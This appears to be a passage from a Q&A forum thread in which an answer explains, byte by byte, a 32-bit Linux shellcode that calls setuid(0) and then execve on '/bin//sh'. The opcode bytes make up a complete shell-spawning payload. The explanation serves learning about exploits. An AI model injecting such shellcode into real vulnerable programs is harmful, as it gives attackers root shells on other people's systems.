But why in this shellcode,the arguments are not only placed on the register,but also pushed on the stack ? Quite confusing here.\n\nCan someone give me a brief explaination about this problem ?Much appreciate!\n\n",

      "content": "It only uses the stack to pass the correct values to registers. If you analyse this shell code closely you will identify that all the stack operations are in the end results in some value being put in a register that it is expected.\n\nTake a look at this part that calls setuid(0):\n\n```\n\"\\x6a\\x17\"          // push $0x17\n\"\\x58\"              // pop  %eax\n\"\\x31\\xdb\"          // xor  %ebx, %ebx\n\"\\xcd\\x80\"          // int  $0x80\n\n```\nThe first operations puts $0x17 into eax which is exactly the value that's is needed for setuid. Clearing ebx for the value being passed to setuid.\n\nIn the same way we can check execv.\n\n```\n\"\\x31\\xd2\"              // xor  %edx, %edx\n\"\\x6a\\x0b\"              // push $0xb\n\"\\x58\"                  // pop  %eax\n\"\\x52\"                  // push %edx\n\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f\n\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f\n\"\\x89\\xe3\"              // mov  %esp, %ebx\n\"\\x52\"                  // push %edx\n\"\\x53\"                  // push %ebx\n\"\\x89\\xe1\"              // mov  %esp, %ecx\n\"\\xcd\\x80\";             // int  $0x80\n\n```\nStep by step:\n\n```\n\"\\x31\\xd2\"              // xor  %edx, %edx\n\n```\nclearing edx for later.\n\n```\n\"\\x6a\\x0b\"              // push $0xb\n\"\\x58\"                  // pop  %eax\n\n```\nputs execv code (0xb) into eax.\n\n```\n\"\\x52\"                  // push %edx        -> NULL\n\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f -> hs//\n\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f -> nib/\n\n```\nsince edx was cleared as the first instruction this puts /bin//sh\\0 on the stack and the next instruction\n\n```\n\"\\x89\\xe3\"              // mov  %esp, %ebx\n\n```\nput the address of the top of the stack into ebx -> execv expects there the first argument.\n\n```\n\"\\x52\"                  // push %edx\n\"\\x53\"                  // push %ebx\n\"\\x89\\xe1\"              // mov  %esp, %ecx\n\n```\nthis puts NULL + the address of the same string again on the stack and one more time assigning the address of the top of the stack to ecx where is expected to be \narguments. 'edx' was set to zero so it is like that being passed to execv. \n\nIt looks like this is assuming that esi is/was cleared.\n\n",
